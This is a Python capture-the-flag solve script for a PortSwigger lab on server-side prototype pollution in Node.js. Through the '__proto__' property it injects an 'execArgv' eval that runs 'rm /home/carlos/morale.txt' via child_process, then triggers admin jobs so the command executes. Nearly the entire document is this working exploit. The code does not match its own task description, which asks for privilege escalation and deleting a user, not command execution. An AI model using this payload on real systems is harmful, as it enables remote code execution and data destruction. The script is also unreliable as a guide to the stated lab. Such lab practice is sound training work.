'''
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.

To solve the lab:

Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
Identify a gadget property that you can use to escalate your privileges.
Access the admin panel and delete the user carlos.
You can log in to your own account with the following credentials: wiener:peter

Link: https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution
'''

import requests
from bs4 import BeautifulSoup

lab_id = '0ac900f704971ecc83972f9e00440013' # change according to generated lab_id
s = requests.Session()


def token_extract(resp): # function for parsing the csrf token when needed
    soup = BeautifulSoup(resp, 'lxml')
    return soup.find('input', {'name': 'csrf'})['value']


def main():
    # First we need to login as wiener:peter as provided in the instructions
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    token = token_extract(r.text) # login csrf token

    # data for the post request to login
    data = { 'csrf' : token,
            "username" : "wiener",
            "password": "peter"
    }
    r2 = s.post(uri, json=data)   
   
    # We pollute the change-address data with our malicious eval statment
    uri = f"https://{lab_id}.web-security-academy.net/my-account/change-address"
    data = {"address_line_1":"Wiener HQ",
            "address_line_2":"One Wiener Way",
            "city":"Wienerville",
            "postcode":"BU1 1RP",
            "country":"UK",
            "sessionId":s.cookies.get_dict()['session'],
            "__proto__": {
                "execArgv":["--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"]
            }
        }
    r3 = s.post(uri, json=data)
    
    # now we go to the admin page to reterive the jobs csrf token
    uri = f"https://{lab_id}.web-security-academy.net/admin"
    r3 = s.get(uri)
    admin_token = token_extract(r3.text) # jobs csrf token

    # when we run the jobs, our malicious eval statment runs with it
    uri = f"https://{lab_id}.web-security-academy.net/admin/jobs"
    data = {"csrf":admin_token,
            "sessionId":s.cookies.get_dict()['session'],
            "tasks":["db-cleanup","fs-cleanup"],
        }
    r4 = s.post(uri, json=data)
    print('finished')


if __name__ == '__main__':
    main()